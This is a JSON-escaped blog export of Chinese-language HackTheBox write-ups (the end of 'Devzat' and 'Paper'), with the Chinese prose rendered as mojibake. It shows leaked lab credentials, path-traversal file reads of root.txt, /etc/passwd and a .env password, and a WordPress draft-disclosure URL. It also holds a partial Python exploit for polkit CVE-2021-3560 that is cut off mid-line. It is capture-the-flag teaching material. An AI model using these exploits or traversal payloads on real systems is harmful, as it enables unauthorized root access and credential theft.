[\n                        [\n                            \"2021-06-22T20:04:16.313965493Z\",\n                            false,\n                            \"WillyWonka2021\",\n                            \"wilhelm\"\n                        ],\n                        [\n                            \"2021-06-22T20:04:16.320782034Z\",\n                            true,\n                            \"woBeeYareedahc7Oogeephies7Aiseci\",\n                            \"catherine\"\n                        ],\n                        [\n                            \"2021-06-22T20:04:16.996682002Z\",\n                            true,\n                            \"RoyalQueenBee$\",\n                            \"charles\"\n                        ]\n                    ]\n                }\n            ],\n            \"statement_id\": 0\n        }\n    ]\n}\n```\n### Catherine\nåœ¨sshä¸­ä½¿ç”¨suåˆ‡æ¢åˆ°catherineç”¨æˆ·\n\n```bash\nusername = catherine\npassword = woBeeYareedahc7Oogeephies7Aiseci\n```\n```bash\ncatherine@devzat:~$ ls\ndev  devzat-dev.zip  devzat-main.zip  main  user.txt\ncatherine@devzat:~$ cat user.txt \na45f55a41f9cd103ea222c1e00466341\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\n```bash\ncatherine@devzat:/var/backups$ ls\napt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  devzat-dev.zip  devzat-main.zip\n```\nåœ¨/var/backupsç›®å½•ä¸­æœ‰ä¸¤ä¸ªzipæ–‡ä»¶ï¼Œæˆ‘ä»¬copyå‡ºæ¥è§£å‹å‡ºæ¥çœ‹çœ‹\n\n```bash\ncatherine@devzat:/tmp/lucifiel$ ls\ndev  devzat-dev.zip  devzat-main.zip  main\n```\n```bash\ncatherine@devzat:/tmp/lucifiel$ diff main/commands.go dev/commands.go\n3a4\n>       \"bufio\"\n4a6,7\n>       \"os\"\n>       \"path/filepath\"\n36a40\n>               file        = commandInfo{\"file\", \"Paste a files content directly to chat [alpha]\", fileCommand, 1, false, nil}\n38c42,101\n<       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}\n---\n>       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}\n> }\n> \n> func fileCommand(u *user, args []string) {\n>       if len(args) < 1 {\n>               u.system(\"Please provide file to print and the password\")\n>               return\n>       }\n> \n>       if len(args) < 2 {\n>               u.system(\"You need to provide the correct password to use this function\")\n>               return\n>       }\n> \n>       path := args[0]\n>       pass := args[1]\n> \n>       // Check my secure password\n>       if pass != \"CeilingCatStillAThingIn2021?\" {\n>               u.system(\"You did provide the wrong password\")\n>               return\n>       }\n> \n>       // Get CWD\n>       cwd, err := os.Getwd()\n>       if err != nil {\n>               u.system(err.Error())\n>       }\n> \n>       // Construct path to print\n>       printPath := filepath.Join(cwd, path)\n> \n>       // Check if file exists\n>       if _, err := os.Stat(printPath); err == nil {\n>               // exists, print\n>               file, err := os.Open(printPath)\n>               if err != nil {\n>                       u.system(fmt.Sprintf(\"Something went wrong opening the file: %+v\", err.Error()))\n>                       return\n>               }\n>               defer file.Close()\n> \n>               scanner := bufio.NewScanner(file)\n>               for scanner.Scan() {\n>                       u.system(scanner.Text())\n>               }\n> \n>               if err := scanner.Err(); err != nil {\n>                       u.system(fmt.Sprintf(\"Something went wrong printing the file: %+v\", err.Error()))\n>               }\n> \n>               return\n> \n>       } else if os.IsNotExist(err) {\n>               // does not exist, print error\n>               u.system(fmt.Sprintf(\"The requested file @ %+v does not exist!\", printPath))\n>               return\n>       }\n>       // bokred?\n>       u.system(\"Something went badly wrong.\")\n```\nè¿™é‡Œè·å¾—äº†ä¸€ä¸ªå¯†ç CeilingCatStillAThingIn2021?ï¼ŒåŒæ—¶åˆ†æä»£ç åçŸ¥é“äº†å­˜åœ¨å¯æ§çš„æ–‡ä»¶è¯»å–åŠŸèƒ½ï¼Œé€šè¿‡æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°æ§åˆ¶è·¯å¾„ï¼Œé€šè¿‡æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°passç»•è¿‡æ£€æµ‹\n\n```bash\nssh -l test localhost -p 8443\n```\n```bash\ncatherine@devzat:/tmp/lucifiel$ ssh -l test localhost -p 8443\n                                                                                                                                                                                                  13 minutes earlier\ndevbot: catherine has joined the chat\n                                                                                                                                                                                                  12 minutes earlier\ncatherine: all\n                                                                                                                                                                                                    1 minute earlier\ndevbot: test has joined the chat \ntest: file ../../../../root/root.txt CeilingCatStillAThingIn2021?\ncatherine: close\ndevbot: test has left the chat \ndevbot: test stayed on for 1 minute \ncatherine: exit\nWelcome to the chat. There is one more user\ndevbot: test has joined the chat\ntest: /file ../../../../root/root.txt CeilingCatStillAThingIn2021?\n[SYSTEM] c2b07bb41d02e2c880a4d1c9469d13ef\n```\næˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶","tags":["Hackthebox"]},{"title":"Paper - Hackthebox","url":"/2022/02/19/Hackthebox/Easy/Hackthebox-Paper/","content":"\n# Hackthebox - Paper\n## é¶åœºä¿¡æ¯\n![](Hackthebox-Paper/b01ad57e-532f-4607-9439-8e61ddf6015a.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-Paper/256d4bc5-a248-4c39-a06c-c3a6afadbbc6.png)\n\n## ä¿¡æ¯æœé›†\n### nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.143\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 22:29 EST\nNmap scan report for 10.10.11.143\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)\n|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)\n|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\n| Subject Alternative Name: DNS:localhost.localdomain\n| Not valid before: 2021-07-03T08:52:34\n|_Not valid after:  2022-07-08T10:32:34\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36529%PV=Y%DS=2%DC=T%G=Y%TM=6210646\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   239.51 ms 10.10.14.1\n2   239.64 ms 10.10.11.143\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.23 seconds\n```\n### Http\n![](Hackthebox-Paper/45c48f81-2c45-45cd-af04-81b9e5f32c5d.png)\n\næŸ¥çœ‹80ç«¯å£çš„Httpé¡µé¢ï¼Œå‘ç°æ˜¯ä¸€ä¸ªnginxçš„é»˜è®¤é¡µé¢\n\næš‚æ—¶æ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œå»çœ‹çœ‹å“åº”åŒ…å§\n\n![](Hackthebox-Paper/9ef66497-38ed-4b23-83ef-02ba7acbfed1.png)\n\nåœ¨å“åº”åŒ…ä¸­çœ‹åˆ°äº†ä¸€ä¸ªåŸŸåoffice.htb\n\nå»åŠ å…¥åˆ°hostsé‡Œ\n\n```bash\necho 10.10.11.143 office.paper\n```\n![](Hackthebox-Paper/add1edb1-9622-4703-a293-46e854fc1fff.png)\n\nè®¿é—®åå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªwordpressæ­å»ºçš„\n\nä½¿ç”¨wpscanæ‰«æçœ‹çœ‹\n\n### Wpscan\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# wpscan --url http://office.paper/\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://office.paper/ [10.10.11.143]\n[+] Started: Fri Feb 18 22:59:11 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n |  - X-Powered-By: PHP/7.2.24\n |  - X-Backend-Server: office.paper\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] WordPress readme found: http://office.paper/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).\n | Found By: Rss Generator (Passive Detection)\n |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>\n |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>\n\n[+] WordPress theme in use: construction-techup\n | Location: http://office.paper/wp-content/themes/construction-techup/\n | Last Updated: 2021-07-17T00:00:00.000Z\n | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt\n | [!] The version is out of date, the latest version is 1.4\n | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1\n | Style Name: Construction Techup\n | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...\n | Author: wptexture\n | Author URI: https://testerwp.com/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:06 <=====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Fri Feb 18 22:59:23 2022\n[+] Requests Done: 143\n[+] Cached Requests: 31\n[+] Data Sent: 35.766 KB\n[+] Data Received: 91.745 KB\n[+] Memory used: 230.363 MB\n[+] Elapsed time: 00:00:11\n```\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬å·æ˜¯Wordpress 5.2.3\n\nå»Googleä¸€ä¸‹æ˜¯å¦æœ‰Exploit\n\n> [https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)\n\nè¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯æŸ¥çœ‹ä»–äººç§äººå¸–å­çš„æ¼æ´ï¼Œå»ä½¿ç”¨çœ‹çœ‹\n\n```bash\nhttp://office.paper/?static=1&order=asc\n```\nç›´æ¥ä½¿ç”¨ä¼šæç¤º404ï¼Œå°è¯•æŠŠåé¢&order=ascåˆ é™¤è¯•è¯•\n\n```bash\nhttp://office.paper/?static=1\n```\n![](Hackthebox-Paper/1d61a788-f447-43c4-81f1-d8fad3fb4579.png)\n\næˆåŠŸè¯»å–åˆ°ä¸€ç¯‡å¸–å­ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å…¶ä¸­å†…å®¹\n\n```Plain Text\ntest\n\nMicheal please remove the secret from drafts for gods sake!\n\nHello employees of Blunder Tiffin,\n\nDue to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.\n\nSo, I kindly request you all to take your discussions from the public blog to a more private chat system.\n\n-Nick\n\n# Warning for Michael\n\nMichael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick\n\nThreat Level Midnight\n\nA MOTION PICTURE SCREENPLAY,\nWRITTEN AND DIRECTED BY\nMICHAEL SCOTT\n\n[INT:DAY]\n\nInside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigtâ€¦.\n\n# Secret Registration URL of new Employee chat system\n\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n\n# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.\n\n# Also, stop looking at my drafts. Jeez!\n```\nå…¶ä¸­æåˆ°äº†ä¸€ä¸ªæ–°å‘˜å·¥èŠå¤©ç³»ç»Ÿçš„ç§˜å¯†ç½‘å€\n\n```bash\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n```\næŠŠæ–°ç½‘å€æ·»åŠ åˆ°hostsé‡Œ\n\n```bash\necho 10.10.11.143 chat.office.paper\n```\n![](Hackthebox-Paper/c63d28a6-6d9a-49dd-a6fd-0c00297ea34f.png)\n\nè¿™é‡Œå¯ä»¥æ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ·\n\næˆ‘ä»¬å»æ³¨å†Œä¸€ä¸ªå§\n\n![](Hackthebox-Paper/63577bc9-df3a-445a-baf0-00cb201e0802.png)\n\næ³¨å†ŒåæˆåŠŸç™»å½•è¿›æ¥ï¼Œå»çœ‹çœ‹æœ‰ä»€ä¹ˆå†…å®¹æ²¡æœ‰\n\n![](Hackthebox-Paper/078fe563-78d3-4fef-a815-71502a267451.png)\n\nç¨ç­‰ä¸€ä¼šç„¶åçœ‹åˆ°äº†ä¸€ä¸ªæ–°çš„å†…å®¹ï¼Œå»çœ‹çœ‹\n\n![](Hackthebox-Paper/25e41e7f-1d57-41b1-a906-f25da6196bbe.png)\n\nè¿™é‡Œæåˆ°æœ‰äººåœ¨è¯¥é¢‘é“ä¸­æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æœºå™¨äººï¼Œåªéœ€è¦è¾“å…¥recyclops helpæœºå™¨äººå°±ä¼šå‘Šè¯‰ä½ å¯ä»¥åšä»€ä¹ˆ\n\n```Plain Text\nHello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.\nMost frequently asked questions include:\n- What time is it?\n- What new files are in your sales directory?\n- Why did the salesman crossed the road?\n- What's the content of file x in your sales directory? etc.\nPlease note that I am a beta version and I still have some bugs to be fixed.\nHow to use me ? :\n1. Small Talk:\nYou can ask me how dwight's weekend was, or did he watched the game last night etc.\neg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?\n2. Joke:\nYou can ask me Why the salesman crossed the road.\neg: 'recyclops why did the salesman crossed the road?'\n<=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>\nFor security reasons, the access is limited to the Sales folder.\n3. Files:\neg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'\n4. List:\nYou can ask me to list the files\n5. Time:\nYou can ask me to what the time is\neg: 'recyclops what time is it?' or just 'recyclops time'\n```\nç„¶åæœºå™¨äººç»™å‡ºäº†è‡ªå·±çš„ç”¨æ³•\n\n## æ¼æ´åˆ©ç”¨\nç›®å‰å¯çŸ¥çš„ä¿¡æ¯\n\n1. æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªå¯ä»¥äº’åŠ¨çš„æœºå™¨äºº recyclops\n2. æœºå™¨äººå¯ä»¥å¸®æˆ‘ä»¬è·å¾—æ–‡ä»¶\n3. æˆ‘ä»¬æ— æ³•åœ¨é¢‘é“å†…å‘è¨€\n\nOKï¼Œåˆ°è¿™é‡Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å»æ‰¾æœºå™¨äººç§èŠ\n\n![](Hackthebox-Paper/1d474983-597c-4e3d-957a-59035a2a19e7.png)\n\nè¿™é‡Œè¦æ±‚ä»–è¯»å–test.txtæ–‡ä»¶\n\nå›å¤æ–‡ä»¶/home/dwight/sales/test.txtæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥è·¯å¾„ç©¿è¶Š\n\n![](Hackthebox-Paper/09696c50-4498-48a5-b31a-b4e721ce4bac.png)\n\nè¿™è¾¹æ„é€ äº†ä¸€ä¸‹è·¯å¾„ï¼ŒæˆåŠŸè·å¾—/etc/passwdæ–‡ä»¶\n\n```bash\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\ngames:x:12:100:games:/usr/games:/sbin/nologin\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\nsystemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin\nsystemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin\ntss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin\npolkitd:x:998:996:User for polkitd:/:/sbin/nologin\ngeoclue:x:997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin\nrtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin\nqemu:x:107:107:qemu user:/:/sbin/nologin\napache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\ncockpit-ws:x:996:993:User for cockpit-ws:/:/sbin/nologin\npulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin\nusbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin\nunbound:x:995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\ngluster:x:994:989:GlusterFS daemons:/run/gluster:/sbin/nologin\nchrony:x:993:987::/var/lib/chrony:/sbin/nologin\nlibstoragemgmt:x:992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin\nsaslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin\ndnsmasq:x:985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\nradvd:x:75:75:radvd user:/:/sbin/nologin\nclevis:x:984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin\npegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin\nsssd:x:983:981:User for sssd:/:/sbin/nologin\ncolord:x:982:980:User for colord:/var/lib/colord:/sbin/nologin\nrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsetroubleshoot:x:981:979::/var/lib/setroubleshoot:/sbin/nologin\npipewire:x:980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin\ngdm:x:42:42::/var/lib/gdm:/sbin/nologin\ngnome-initial-setup:x:979:977::/run/gnome-initial-setup/:/sbin/nologin\ninsights:x:978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\navahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin\nnginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin\nmongod:x:976:974:mongod:/var/lib/mongo:/bin/false\nrocketchat:x:1001:1001::/home/rocketchat:/bin/bash\ndwight:x:1004:1004::/home/dwight:/bin/bash\n```\n### User\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å½“å‰æ–‡ä»¶\n\n```bash\nrecyclops list\n\ntotal 0\ndrwxr-xr-x  4 dwight dwight  32 Jul  3  2021 .\ndrwx------ 11 dwight dwight 334 Feb 18 20:41 ..\ndrwxr-xr-x  2 dwight dwight  27 Sep 15 13:03 sale\ndrwxr-xr-x  2 dwight dwight  27 Jul  3  2021 sale_2\n```\nâ€ƒæ²¡ä»€ä¹ˆå¯çœ‹çš„ï¼Œç»§ç»­æŸ¥çœ‹ä¸Šçº§ç›®å½•\n\n```bash\nrecyclops list ../\n\ntotal 788\ndrwx------  11 dwight dwight    334 Feb 18 20:41 .\ndrwxr-xr-x.  3 root   root       20 Feb 18 23:14 ..\nlrwxrwxrwx   1 dwight dwight      9 Jul  3  2021 .bash_history -> /dev/null\n-rw-r--r--   1 dwight dwight     18 May 10  2019 .bash_logout\n-rw-r--r--   1 dwight dwight    141 May 10  2019 .bash_profile\n-rw-r--r--   1 dwight dwight    358 Jul  3  2021 .bashrc\n-rwxr-xr-x   1 dwight dwight   1174 Sep 16 06:58 bot_restart.sh\ndrwx------   5 dwight dwight     56 Jul  3  2021 .config\n-rw-------   1 dwight dwight     16 Jul  3  2021 .esd_auth\ndrwx------   3 dwight dwight     69 Feb 18 22:58 .gnupg\ndrwx------   8 dwight dwight   4096 Sep 16 07:57 hubot\n-rw-rw-r--   1 dwight dwight     18 Sep 16 07:24 .hubot_history\n-rwxr-xr-x   1 dwight dwight 765818 Feb 18 20:37 linpeas.sh\ndrwx------   3 dwight dwight     19 Jul  3  2021 .local\ndrwxr-xr-x   4 dwight dwight     39 Jul  3  2021 .mozilla\ndrwxrwxr-x   5 dwight dwight     83 Jul  3  2021 .npm\ndrwxr-xr-x   4 dwight dwight     32 Jul  3  2021 sales\ndrwx------   2 dwight dwight      6 Sep 16 08:56 .ssh\n-rw-rw-r--   1 dwight dwight   2434 Feb 18 20:41 testfile.py\n-r--------   1 dwight dwight     33 Feb 18 19:01 user.txt\ndrwxr-xr-x   2 dwight dwight     24 Sep 16 07:09 .vim\n-rw-------   1 dwight dwight    818 Feb 18 20:41 .viminfo\n```\nåœ¨è¿™ä¸ªç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ªhubotæ–‡ä»¶æˆ‘å¾ˆå¥½å¥‡ï¼Œè¿›å»çœ‹çœ‹\n\n```bash\nrecyclops list ../hubot\n\ntotal 1908\ndrwx------   8 dwight dwight    4096 Sep 16 07:57 .\ndrwx------  11 dwight dwight     334 Feb 18 20:41 ..\n-rw-r--r--   1 dwight dwight       0 Jul  3  2021 \\\nsrwxr-xr-x   1 dwight dwight       0 Jul  3  2021 127.0.0.1:8000\nsrwxrwxr-x   1 dwight dwight       0 Jul  3  2021 127.0.0.1:8080\ndrwx--x--x   2 dwight dwight      36 Sep 16 07:34 bin\n-rw-r--r--   1 dwight dwight     258 Sep 16 07:57 .env\n-rwxr-xr-x   1 dwight dwight       2 Jul  3  2021 external-scripts.json\ndrwx------   8 dwight dwight     163 Jul  3  2021 .git\n-rw-r--r--   1 dwight dwight     917 Jul  3  2021 .gitignore\n-rw-r--r--   1 dwight dwight 1803113 Feb 18 23:41 .hubot.log\n-rwxr-xr-x   1 dwight dwight    1068 Jul  3  2021 LICENSE\ndrwxr-xr-x  89 dwight dwight    4096 Jul  3  2021 node_modules\ndrwx--x--x 115 dwight dwight    4096 Jul  3  2021 node_modules_bak\n-rwxr-xr-x   1 dwight dwight    1062 Sep 16 07:34 package.json\n-rwxr-xr-x   1 dwight dwight     972 Sep 16 07:26 package.json.bak\n-rwxr-xr-x   1 dwight dwight   30382 Jul  3  2021 package-lock.json\n-rwxr-xr-x   1 dwight dwight      14 Jul  3  2021 Procfile\n-rwxr-xr-x   1 dwight dwight    5044 Jul  3  2021 README.md\ndrwx--x--x   2 dwight dwight     193 Jan 13 10:56 scripts\n-rwxr-xr-x   1 dwight dwight     100 Jul  3  2021 start_bot.sh\ndrwx------   2 dwight dwight      25 Jul  3  2021 .vscode\n-rwxr-xr-x   1 dwight dwight   29951 Jul  3  2021 yarn.lock\n```\nåœ¨hubotç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ª.envæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶\n\n```bash\nrecyclops file ../hubot/.env\n\nexport ROCKETCHAT_URL='http://127.0.0.1:48320'\nexport ROCKETCHAT_USER=recyclops\nexport ROCKETCHAT_PASSWORD=Queenofblad3s!23\nexport ROCKETCHAT_USESSL=false\nexport RESPOND_TO_DM=true\nexport RESPOND_TO_EDITED=true\nexport PORT=8000\nexport BIND_ADDRESS=127.0.0.1\n```\nè¿™é‡Œå¾—åˆ°äº†ä¸€ä¸ªå¯†ç \n\n```Plain Text\nQueenofblad3s!23\n```\nå»ä½¿ç”¨sshç™»å½•è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh dwight@10.10.11.143                  \nThe authenticity of host '10.10.11.143 (10.10.11.143)' can't be established.\nECDSA key fingerprint is SHA256:2eiFA8VFQOZukubwDkd24z/kfLkdKlz4wkAa/lRN3Lg.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.143' (ECDSA) to the list of known hosts.\ndwight@10.10.11.143's password: \nActivate the web console with: systemctl enable --now cockpit.socket\n\nLast login: Fri Feb 18 23:58:30 2022 from 10.10.14.56\n[dwight@paper ~]$ whoami&&id\ndwight\nuid=1004(dwight) gid=1004(dwight) groups=1004(dwight)\n```\næˆåŠŸè·å¾—useræƒé™\n\n```bash\n[dwight@paper ~]$ ls\nbot_restart.sh  hubot  linpeas.sh  sales  testfile.py  user.txt\n[dwight@paper ~]$ cat user.txt \n8247362b1baac2f85fd97507b5104341\n```\næˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶\n\n## æƒé™æå‡\n### Root\nè¿™é‡Œä½¿ç”¨CVE-2021-3560è¿›è¡Œææƒ\n\n```python\nimport os\nimport sys\nimport time\nimport subprocess\nimport random\nimport pwd\n\nprint (\"**************\")\nprint(\"Exploit: Privilege escalation with polkit - CVE-2021-3560\")\nprint(\"Exploit code written by Ahmad Almorabea @almorabea\")\nprint(\"Original exploit author: Kevin Backhouse \")\nprint(\"For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/\")\nprint (\"**************\")\nprint(\"[+] Starting the Exploit \")\ntime.sleep(3)\n\ncheck = True\ncounter = 0\nwhile check:\n        counter = counter +1\n        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:ahmed','string:\"Ahmad Almorabea','int32:1'])\n        try:\n                #print('1 - Running in process', process.pid)\n                Random = random.uniform(0.006,0.009)\n                process.wait(timeout=Random)\n                process.kill()\n        except subprocess.TimeoutExpired:\n                #print('Timed out - killing', process.pid)\n                process.kill()\n\n        user = subprocess.run(['id', 'ahmed'], 